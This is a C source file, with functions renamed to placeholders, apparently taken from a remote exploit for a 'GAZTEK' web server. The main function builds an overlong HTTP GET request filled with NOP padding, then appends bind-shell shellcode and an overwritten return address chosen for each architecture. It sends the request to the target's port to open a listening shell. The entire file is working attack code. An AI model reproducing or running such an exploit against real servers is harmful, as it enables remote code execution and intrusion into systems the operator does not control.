#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */
typedef  struct TYPE_4__   TYPE_2__ ;
typedef  struct TYPE_3__   TYPE_1__ ;

/* Type definitions */
typedef  int /*<<< orphan*/  target ;
struct TYPE_3__ {int s_addr; } ;
struct sockaddr_in {int /*<<< orphan*/  sin_zero; TYPE_1__ sin_addr; int /*<<< orphan*/  sin_port; int /*<<< orphan*/  sin_family; } ;
struct sockaddr {int dummy; } ;
struct TYPE_4__ {int adjusted_buf; long addr; int id; char* os; } ;

/* Variables and functions */
 int /*<<< orphan*/  AF_INET ; 
 int /*<<< orphan*/  ARCH_NUMBER ; 
 int BIND_PORT ; 
 int /*<<< orphan*/  GAZTEK_PORT ; 
 int MIN_BUFFER_SIZE ; 
 int /*<<< orphan*/  NOP ; 
 int /*<<< orphan*/  SOCK_STREAM ; 
 TYPE_2__* architectures ; 
 int FUNC0 (char*) ; 
 char* bindshell ; 
 int /*<<< orphan*/  FUNC1 (int /*<<< orphan*/ *,int) ; 
 int FUNC2 (int,struct sockaddr*,int) ; 
 int /*<<< orphan*/  FUNC3 (int) ; 
 int /*<<< orphan*/  FUNC4 (char*) ; 
 int FUNC5 (int,char**,char*) ; 
 int /*<<< orphan*/  FUNC6 (int /*<<< orphan*/ ) ; 
 int FUNC7 (char*) ; 
 char* FUNC8 (int) ; 
 int /*<<< orphan*/  FUNC9 (char*,char*,int) ; 
 int /*<<< orphan*/  FUNC10 (char*,int /*<<< orphan*/ ,int) ; 
 int /*<<< orphan*/  FUNC11 (char*,...) ; 
 int FUNC12 (int /*<<< orphan*/ ,int /*<<< orphan*/ ,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC13 (char*,char*,char*) ; 
 int /*<<< orphan*/  FUNC14 (char*,char*) ; 
 int FUNC15 (char*) ; 
 int /*<<< orphan*/  FUNC16 (char**) ; 
 int FUNC17 (int,char*,int) ; 

FUNC18(int argc, char *argv[])
{
		 int c, c_size, ip_lenght, arch_id, sock_fd, errflg=0, ban_chk=0, exp_flg=0;
		 char *addr, *get_buf, *get_buf_str;
		 long ret;

		 extern char *optarg;
		 extern int optind, optopt;

		 struct sockaddr_in target;

		 if(argc == 1)
		 		 FUNC16(argv);

		 while((c = FUNC5(argc, argv, "b:d:")) != -1)
		 {
		 		 switch(c)
		 		 {
		 		 		 case 'b':
		 		 		 		 addr = FUNC8(FUNC15(optarg));
		 		 		 		 FUNC14(addr, optarg);
		 		 		 		 ban_chk++;
		 		 		 		 break;
		 		 		 case 'd':
		 		 		 		 if(!(argv[optind]))
		 		 		 		 		 errflg++;
		 		 		 		 if(!(argv[optind+1]))
		 		 		 		 		 errflg++;
		 		 		 		 if(errflg == 0)
		 		 		 		 {
		 		 		 		 		 if((arch_id = FUNC0(optarg)) < 0 || (arch_id = FUNC0(optarg)) > (ARCH_NUMBER-1))
		 		 		 		 		 {
		 		 		 		 		 		 FUNC11("Invalid architecture id.\n");
		 		 		 		 		 		 FUNC3(-1);
		 		 		 		 		 }

		 		 		 		 		 if((FUNC7(argv[optind])) != -1)
		 		 		 		 		 		 ip_lenght = FUNC15(argv[optind+1]);
		 		 		 		 		 else
		 		 		 		 		 {
		 		 		 		 		 		 FUNC11("\"%s\" is an invalid ip address.\n", argv[optind]);
		 		 		 		 		 		 FUNC3(-1);
		 		 		 		 		 }
		 		 		 		 		 addr = FUNC8(FUNC15(argv[optind+1]));
		 		 		 		 		 FUNC14(addr, argv[optind+1]+1);
		 		 		 		 		 exp_flg++;
		 		 		 		 }

		 		 		 		 break;
		 		 		 case ':':
		 		 		 		 errflg++;
		 		 		 		 break;
		 		 		 case '?':
		 		 		 		 errflg++;
		 		 }
		 }

		 if(errflg > 0)
		 		 FUNC16(argv);

		 /* check banner info */
		 if(ban_chk > 0)
		 		 FUNC4(addr);

		 if(!(exp_flg))
		 		 FUNC16(argv);
/*
        Buffer Size Craft Relation
        min string size                    = 192 bytes
        string "GET _" size                =   4 bytes
        max log ip size "255.255.255.255"  =  15 bytes
        string "\n\n" size                 =   2 bytes
                                           = 198 bytes
                                                        */
		 /* dont count with GET request and newline bytes */
		 c_size = ((MIN_BUFFER_SIZE+15-ip_lenght-4-2)+(architectures[arch_id].adjusted_buf));
		 /* NULL string byte */
		 c_size = c_size+1;

		 /* builds crafted buffer */
		 get_buf = FUNC8(c_size);
		 /* counts with all constants sizes */
		 get_buf_str = FUNC8((c_size+4+2));

		 FUNC10(get_buf, NOP, c_size);
		 FUNC9(get_buf+(c_size-1-4-FUNC15(bindshell)), bindshell, FUNC15(bindshell));
		 *(long*)&get_buf[c_size-4-1] = architectures[arch_id].addr;
		 get_buf[c_size-1] = '\0';

		 /* final buffer, now just inject on connection */
		 FUNC13(get_buf_str,"GET %s\n\n", get_buf);

		 /* infos */
		 FUNC11("target: %s\n", addr);
		 FUNC11("arch id: %d, %s, 0x%x\n", architectures[arch_id].id, architectures[arch_id].os, architectures[arch_id].addr);
		 FUNC11("ip size: %d bytes\n", ip_lenght);
		 FUNC11("Adjust: %d bytes\n", architectures[arch_id].adjusted_buf);
		 FUNC11("buffer size: %d bytes\n", FUNC15(get_buf_str));
		 FUNC11("bind shellcode size: %d bytes\n", FUNC15(bindshell));
		 FUNC11("bind shell tcp port: %d\n", BIND_PORT);
		 FUNC11("Injecting code at 0x%x...\n", architectures[arch_id].addr);

		 /* start socket() */

        if((sock_fd = FUNC12(AF_INET, SOCK_STREAM, 0)) < 1)
        {
                FUNC11("socket() error.\n");
                FUNC3(-1);
        }

        target.sin_family = AF_INET;
        target.sin_port = FUNC6(GAZTEK_PORT);

        if((target.sin_addr.s_addr = FUNC7(addr)) == -1)
        {
                FUNC11("\"%s\" is an invalid ip address.\n", addr);
                FUNC3(-1);
        }

        FUNC1(&(target.sin_zero), 8);

        if((FUNC2(sock_fd, (struct sockaddr *)&target, sizeof(target))) == -1)
		 {
                FUNC11("connect() error.\n");
                FUNC3(-1);
        }

        if((FUNC17(sock_fd, get_buf_str, FUNC15(get_buf_str))) == -1)
        {
                FUNC11("write() error.\n");
                FUNC3(-1);
        }

		 FUNC11("Done!\n");

return 0;
}